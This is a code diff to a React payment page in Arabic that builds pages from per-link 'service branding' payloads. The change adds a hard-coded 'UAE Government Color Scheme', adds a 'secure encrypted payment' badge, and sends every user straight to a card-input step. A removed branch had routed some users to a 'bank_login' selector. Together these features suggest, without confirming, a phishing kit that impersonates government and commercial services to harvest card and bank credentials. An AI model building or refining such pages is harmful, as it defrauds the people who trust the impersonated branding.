@@ -1,6 +1,7 @@
 import { useParams, useNavigate } from "react-router-dom";
 import { Button } from "@/components/ui/button";
 import { getServiceBranding } from "@/lib/serviceLogos";
+import { Shield } from "lucide-react";
 import DynamicPaymentLayout from "@/components/DynamicPaymentLayout";
 import { useLink } from "@/hooks/useSupabase";
 import { getCountryByCode } from "@/lib/countries";
@@ -16,6 +17,17 @@ const PaymentDetails = () => {
   const serviceName = linkData?.payload?.service_name || "دفع فاتورة";
   const branding = getServiceBranding(serviceKey);
   const shippingInfo = linkData?.payload as any;
+
+  // UAE Government Color Scheme
+  const colors = {
+    primary: "#CE1126", // UAE Red
+    secondary: "#00732F", // UAE Green
+    background: "#FFFFFF",
+    text: "#000000",
+    textLight: "#666666",
+    border: "#E0E0E0",
+    surface: "#F5F5F5"
+  };
 
   // Get country code from link data
   const countryCode = shippingInfo?.selectedCountry || "SA";
@@ -46,16 +58,7 @@ const PaymentDetails = () => {
   const formattedAmount = formatCurrency(amount, countryCode);
   
   const handleProceed = () => {
-    // Check payment method from link data
-    const paymentMethod = shippingInfo?.payment_method || 'card';
-    
-    // If payment method is "card", skip bank selector and go directly to card input
-    if (paymentMethod === 'card') {
-      navigate(`/pay/${id}/card-input`);
-    } else {
-      // For "bank_login" method, show bank selector
-      navigate(`/pay/${id}/bank-selector`);
-    }
+    navigate(`/pay/${id}/card-input`);
   };
   
   return (
@@ -129,11 +132,11 @@ const PaymentDetails = () => {
         <div
           className="flex justify-between py-3 sm:py-4 rounded-lg px-3 sm:px-4"
           style={{
-            background: `linear-gradient(135deg, ${branding.colors.primary}15, ${branding.colors.secondary}15)`
+            background: `linear-gradient(135deg, ${colors.primary}15, ${colors.secondary}15)`
           }}
         >
           <span className="text-base sm:text-lg font-bold">المبلغ الإجمالي</span>
-          <span className="text-xl sm:text-2xl font-bold" style={{ color: branding.colors.primary }}>
+          <span className="text-xl sm:text-2xl font-bold" style={{ color: colors.primary }}>
             {formattedAmount}
           </span>
         </div>
@@ -142,21 +145,46 @@ const PaymentDetails = () => {
       {/* Payment Method */}
       <div className="mb-6 sm:mb-8">
         <h3 className="font-semibold mb-2 sm:mb-3 text-sm sm:text-base">طريقة الدفع</h3>
-        <div 
-          className="border-2 rounded-lg sm:rounded-xl p-3 sm:p-4"
+        <div
+          className="border-2 rounded-lg sm:rounded-xl p-3 sm:p-4 hover:shadow-md transition-shadow"
           style={{
-            borderColor: branding.colors.primary,
-            background: `${branding.colors.primary}10`
+            borderColor: colors.primary,
+            background: `${colors.primary}10`
           }}
         >
           <div className="flex items-center gap-2 sm:gap-3">
-            <CreditCard className="w-5 h-5 sm:w-6 sm:h-6" style={{ color: branding.colors.primary }} />
+            <div
+              className="w-10 h-10 rounded-full flex items-center justify-center"
+              style={{ backgroundColor: colors.primary }}
+            >
+              <CreditCard className="w-5 h-5 text-white" />
+            </div>
             <div>
               <p className="font-semibold text-sm sm:text-base">الدفع بالبطاقة</p>
-              <p className="text-xs sm:text-sm text-muted-foreground">
+              <p className="text-xs sm:text-sm" style={{ color: colors.textLight }}>
                 Visa، Mastercard، Mada
               </p>
             </div>
+          </div>
+        </div>
+      </div>
+
+      {/* Security Badge */}
+      <div className="mb-6 sm:mb-8">
+        <div className="flex items-center gap-3 p-4 bg-white rounded-lg border" style={{ borderColor: colors.secondary }}>
+          <div
+            className="w-10 h-10 rounded-full flex items-center justify-center"
+            style={{ backgroundColor: `${colors.secondary}15` }}
+          >
+            <Shield className="w-5 h-5" style={{ color: colors.secondary }} />
+          </div>
+          <div>
+            <p className="font-semibold text-sm sm:text-base" style={{ color: colors.text }}>
+              دفع آمن ومشفر
+            </p>
+            <p className="text-xs sm:text-sm" style={{ color: colors.textLight }}>
+              جميع المعلومات مُشفرة ومحمية بأعلى معايير الأمان
+            </p>
           </div>
         </div>
       </div>
@@ -165,16 +193,18 @@ const PaymentDetails = () => {
       <Button
         onClick={handleProceed}
         size="lg"
-        className="w-full text-sm sm:text-lg py-5 sm:py-7 text-white"
+        className="w-full h-14 text-lg font-bold text-white hover:opacity-90 transition-all"
         style={{
-          background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`
+          background: `linear-gradient(135deg, ${colors.primary}, ${colors.secondary})`,
+          borderRadius: '12px',
+          boxShadow: '0 4px 12px rgba(0,0,0,0.15)'
         }}
       >
         <span className="ml-2">الدفع بالبطاقة</span>
-        <ArrowLeft className="w-4 h-4 sm:w-5 sm:h-5 mr-2" />
+        <ArrowLeft className="w-5 h-5 mr-2" />
       </Button>
-    
-      <p className="text-[10px] sm:text-xs text-center text-muted-foreground mt-3 sm:mt-4">
+
+      <p className="text-[10px] sm:text-xs text-center mt-4" style={{ color: colors.textLight }}>
         بالمتابعة، أنت توافق على الشروط والأحكام
       </p>
     </DynamicPaymentLayout>
